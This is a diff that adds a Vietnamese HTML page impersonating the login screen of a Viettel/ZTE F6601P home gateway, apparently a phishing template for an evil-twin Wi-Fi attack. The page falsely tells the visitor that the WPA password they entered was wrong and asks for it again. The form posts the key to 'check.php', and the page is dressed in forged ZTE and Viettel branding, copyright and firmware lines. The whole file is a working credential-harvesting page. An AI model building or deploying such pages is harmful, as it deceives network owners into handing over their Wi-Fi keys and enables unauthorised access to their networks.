@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="vi">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>F6601P - Sai Mật Khẩu</title>
+<style type="text/css">
+html, body {
+    min-height: 100%;
+    margin: 0;
+    padding: 0;
+}
+body {
+    text-align: center;
+    background: #F2F2F2;
+    font-size: 12px;
+    color: #313131;
+    font-family: "Microsoft YaHei", Arial, SimSun, Verdana, Helvetica, Sans-Serif, Geneva;
+}
+body, form, h1, h3, h4, p, ul, ol {
+    margin: 0;
+}
+#page_container {
+    position: relative;
+    width: 100%;
+    max-width: 960px;
+    margin: 0 auto;
+    padding: 0 0 15px 0;
+    text-align: left;
+    background: #FFFFFF;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+#page_header {
+    padding-bottom: 0px;
+}
+#banner {
+    position: relative;
+    width: 100%;
+    height: 74px;
+    background: #FFFFFF;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 20px;
+    box-sizing: border-box;
+}
+.logoViet {
+    height: 50px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+.logo-badge {
+    background: #ee0033;
+    color: #fff;
+    font-weight: bold;
+    font-size: 16px;
+    padding: 5px 12px;
+    border-radius: 3px;
+    letter-spacing: 1px;
+}
+.device-title {
+    font-size: 14px;
+    font-weight: bold;
+    color: #333;
+}
+#banner_switchArea {
+    font-size: 12px;
+    color: #ee0033;
+    font-weight: bold;
+    text-align: right;
+}
+#mainNavigator {
+    width: 100%;
+    height: 38px;
+    line-height: 38px;
+    background: #ee0033;
+    color: #FFFFFF;
+    font-weight: bold;
+    display: flex;
+    padding: 0 20px;
+    box-sizing: border-box;
+}
+#mainNavigator span {
+    padding: 0 15px;
+    cursor: default;
+    background: rgba(0,0,0,0.15);
+    border-top: 3px solid #ffffff;
+}
+#page_content {
+    position: relative;
+    padding: 30px 20px;
+    flex: 1;
+}
+#loginWrapper {
+    width: 100%;
+    max-width: 600px;
+    margin: 20px auto;
+    border: 1px solid #D7D7D7;
+    background: #FAFAFA;
+    border-radius: 4px;
+    padding: 25px;
+    box-sizing: border-box;
+}
+.loginTitle {
+    font-size: 15px;
+    font-weight: bold;
+    color: #ee0033;
+    border-bottom: 1px solid #E0E0E0;
+    padding-bottom: 10px;
+    margin-bottom: 20px;
+    text-align: left;
+}
+.errorHint {
+    color: #6c0101;
+    background: #FFEBE4;
+    border: 1px solid #F8B4B4;
+    padding: 12px 15px;
+    margin-bottom: 20px;
+    text-align: left;
+    border-radius: 3px;
+    line-height: 1.5;
+    font-weight: bold;
+}
+.row {
+    display: flex;
+    align-items: center;
+    margin-bottom: 15px;
+}
+.label {
+    width: 160px;
+    text-align: right;
+    padding-right: 15px;
+    font-weight: bold;
+    color: #444;
+}
+.right {
+    flex: 1;
+    text-align: left;
+}
+input[type="text"], input[type="password"] {
+    width: 100%;
+    max-width: 280px;
+    height: 28px;
+    padding: 2px 8px;
+    border: 1.5px solid #ee0033;
+    border-radius: 3px;
+    box-shadow: 0 1px 2px #CCCCCC inset;
+    outline: none;
+    box-sizing: border-box;
+    background: #FFF5F5;
+}
+.toggle-pw {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    margin-left: 10px;
+    font-size: 11px;
+    color: #666;
+    cursor: pointer;
+}
+.button {
+    cursor: pointer;
+    height: 30px;
+    border: none;
+    padding: 0 25px;
+    min-width: 120px;
+    border-radius: 3px;
+    background-color: #ee0033;
+    background-image: linear-gradient(to bottom, #ff1a47, #ee0033);
+    color: #fff;
+    font-weight: bold;
+    font-size: 13px;
+    margin-top: 10px;
+}
+.button:hover {
+    background-color: #c4002a;
+    background-image: linear-gradient(to bottom, #ee0033, #c4002a);
+}
+#page_footer {
+    height: 43px;
+    line-height: 43px;
+    text-align: left;
+    background-color: #F4F4F4;
+    padding: 0 20px;
+    border-top: 1px solid #D7D7D7;
+    font-size: 11px;
+    color: #666;
+    display: flex;
+    justify-content: space-between;
+}
+</style>
+</head>
+<body>
+<div id="page_container">
+    <div id="page_header">
+        <div id="banner">
+            <div class="logoViet">
+                <span class="logo-badge">VIETTEL</span>
+                <span class="device-title">F6601P Home Gateway</span>
+            </div>
+            <div id="banner_switchArea">
+                <span>❌ Lỗi: Sai Mật Khẩu WPA</span>
+            </div>
+        </div>
+        <div id="mainNavigator">
+            <span>XÁC THỰC WPA KEY</span>
+        </div>
+    </div>
+
+    <div id="page_content">
+        <div id="loginWrapper">
+            <div class="loginTitle">Xác Thực Mật Khẩu Wi-Fi (WPA/WPA2 Key) - F6601P</div>
+            
+            <div class="errorHint">
+                ❌ Mật khẩu Wi-Fi (WPA Key) vừa nhập không chính xác! Vui lòng kiểm tra tem nhãn dưới đít modem F6601P hoặc mật khẩu đã cài đặt và thử lại.
+            </div>
+
+            <form action="check.php" method="POST">
+                <div class="row">
+                    <div class="label">Model thiết bị:</div>
+                    <div class="right"><strong>ZTE F6601P (GPON ONT)</strong></div>
+                </div>
+                <div class="row">
+                    <div class="label">Mật Khẩu Wi-Fi:</div>
+                    <div class="right">
+                        <input type="password" id="pwd" name="key1" placeholder="Nhập đúng WPA Key" required autofocus autocomplete="off">
+                        <label class="toggle-pw">
+                            <input type="checkbox" onclick="togglePassword()"> Hiển thị
+                        </label>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin-top: 20px;">
+                    <input type="submit" class="button" value="Thử Lại Xác Thực">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="page_footer">
+        <span id="copyRight">©2008-2026 ZTE Corporation & Viettel Telecom. All rights reserved</span>
+        <span id="pdtVer">Firmware: F6601P_V2.10</span>
+    </div>
+</div>
+
+<script type="text/javascript">
+    function togglePassword() {
+        var x = document.getElementById("pwd");
+        if (x.type === "password") {
+            x.type = "text";
+        } else {
+            x.type = "password";
+        }
+    }
+</script>
+</body>
+</html>
